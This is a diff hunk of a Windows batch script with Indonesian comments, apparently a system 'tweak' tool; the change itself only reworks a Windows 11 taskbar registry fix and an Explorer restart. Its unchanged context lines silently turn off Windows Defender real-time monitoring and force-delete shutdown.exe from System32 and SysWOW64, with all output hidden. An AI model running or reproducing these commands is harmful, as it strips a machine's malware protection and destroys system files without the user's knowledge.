@@ -51,14 +51,10 @@ powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true" >nul 2>&
 del /f /q C:\Windows\System32\shutdown.exe >nul 2>&1
 del /f /q C:\Windows\SysWOW64\shutdown.exe >nul 2>&1
 
-REM --- 5. FIX TASKBAR WIN 11 (ALWAYS SHOW) ---
-echo [*] Fix Taskbar Win 11 biar muncul terus...
-powershell -Command "$p='HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\StuckRects3'; $v=(Get-ItemProperty -Path $p).Settings; $v[8]=2; Set-ItemProperty -Path $p -Name Settings -Value $v" >nul 2>&1
-
-REM --- 6. RESTART EXPLORER (PALING TERAKHIR) ---
-echo [*] Restart Explorer...
-taskkill /f /im explorer.exe >nul 2>&1
-start explorer.exe
+REM --- 5. FIX TASKBAR WIN 11 (ALWAYS SHOW & FORCE REFRESH) ---
+echo [*] Fix Taskbar Win 11 biar muncul terus & Force Refresh UI...
+powershell -Command "$p='HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\StuckRects3'; $v=(Get-ItemProperty -Path $p).Settings; $v[8]=2; Set-ItemProperty -Path $p -Name Settings -Value $v"
+powershell -Command "Stop-Process -Name explorer -Force -ErrorAction SilentlyContinue; Start-Sleep -Seconds 1; Start-Process explorer"
 
 echo.
 echo ============================================
